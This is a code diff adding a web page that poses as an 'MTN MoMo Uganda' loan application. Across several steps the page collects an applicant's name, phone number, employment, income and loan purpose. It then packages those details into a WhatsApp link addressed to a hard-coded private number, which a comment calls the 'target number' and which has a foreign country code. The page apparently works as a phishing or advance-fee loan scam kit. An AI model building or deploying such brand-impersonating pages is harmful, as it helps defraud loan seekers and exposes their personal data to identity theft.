@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTN MoMo Uganda - Loan</title>
+<style>
+  :root{--blue:#0A2E65;--yellow:#FFCC00;--bg:#F5F6F8}
+  *{box-sizing:border-box;font-family:Arial,sans-serif}
+  body{margin:0;background:var(--bg)}
+ .header{background:var(--blue);color:white;text-align:center;padding:25px}
+ .logo{background:var(--yellow);color:var(--blue);display:inline-block;font-weight:900;padding:6px 12px;border-radius:8px;font-size:28px}
+ .card{background:white;max-width:480px;margin:-20px auto 30px;padding:25px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.08)}
+  h1{color:var(--blue);text-align:center;margin:0}
+ .step-text{text-align:center;color:#888;margin:5px 0 15px}
+ .progress{display:flex;gap:8px;margin-bottom:20px}
+ .progress span{height:6px;flex:1;background:#E5E7EB;border-radius:10px}
+ .progress span.active{background:var(--yellow)}
+  label{display:block;margin:14px 0 6px;font-weight:bold;color:#1F2A44}
+  input,select,textarea{width:100%;padding:14px;border:1.5px solid #D1D5DB;border-radius:10px;font-size:15px}
+ .error{display:none;background:#FEE2E2;color:#B91C1C;padding:10px;border-radius:8px;margin-bottom:10px}
+ .summary{border-left:5px solid var(--yellow);background:#FFFEF5;padding:15px;border-radius:12px;margin-top:15px}
+ .row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #eee;font-size:14px}
+ .btns{display:flex;gap:12px;margin-top:20px}
+  button{flex:1;padding:14px;border:none;border-radius:10px;font-weight:bold;cursor:pointer}
+ .btn-next{background:var(--blue);color:white}
+ .btn-back{background:#E5E7EB;color:#555}
+ .btn-start{background:var(--blue);color:white;width:100%}
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="logo">MM</div>
+  <div style="color:var(--yellow);font-weight:bold;">MTN MoMo Uganda</div>
+</div>
+<div class="card" id="form-card"></div>
+
+<script>
+// Your target number
+const TARGET_WHATSAPP = "254753016569";
+
+let data = { amount: 1000000, term: '48 Months' };
+let step = 0;
+
+function getMessageLink() {
+    const msg = `*NEW LOAN APPLICATION*%0A%0A*Loan Details*%0A- Amount: UGX ${Number(data.amount).toLocaleString()}%0A- Term: ${data.term}%0A- Purpose: ${data.purpose}%0A%0A*Applicant Details*%0A- Name: ${data.fname} ${data.lname}%0A- Phone: +256${data.phone}%0A- Employment: ${data.emp}%0A- Income: UGX ${data.income}%0A%0A*Date:* ${new Date().toLocaleString()}`;
+    return `https://wa.me/${TARGET_WHATSAPP}?text=${msg}`;
+}
+
+function render(){
+  const card = document.getElementById('form-card');
+  if(step===0){
+    card.innerHTML = `<h1>Welcome</h1><button class="btn-start" onclick="step=1;render()">START APPLICATION</button>`;
+  } else if(step===1){
+    card.innerHTML = `<h1>Step 1</h1><label>Purpose</label><textarea id="purpose"></textarea><button class="btn-next" onclick="data.purpose=document.getElementById('purpose').value;step=2;render()">NEXT</button>`;
+  } else if(step===2){
+    card.innerHTML = `<h1>Step 2</h1><label>First Name</label><input id="fname"><label>Last Name</label><input id="lname"><label>Phone</label><input id="phone"><button class="btn-next" onclick="data.fname=document.getElementById('fname').value;data.lname=document.getElementById('lname').value;data.phone=document.getElementById('phone').value;step=3;render()">NEXT</button>`;
+  } else if(step===3){
+    card.innerHTML = `<h1>Step 3</h1><label>Employment</label><select id="emp"><option>Employed</option><option>Self-employed</option></select><label>Income</label><input id="income"><button class="btn-next" onclick="data.emp=document.getElementById('emp').value;data.income=document.getElementById('income').value;step=4;render()">FINISH</button>`;
+  } else if(step===4){
+    card.innerHTML = `<h1>Application Received!</h1><p>Click below to send details to WhatsApp:</p><a href="${getMessageLink()}" target="_blank" style="display:block; background:green; color:white; text-align:center; padding:15px; border-radius:10px; text-decoration:none; font-weight:bold;">SUBMIT TO WHATSAPP</a>`;
+  }
+}
+render();
+</script>
+</body>
+</html>
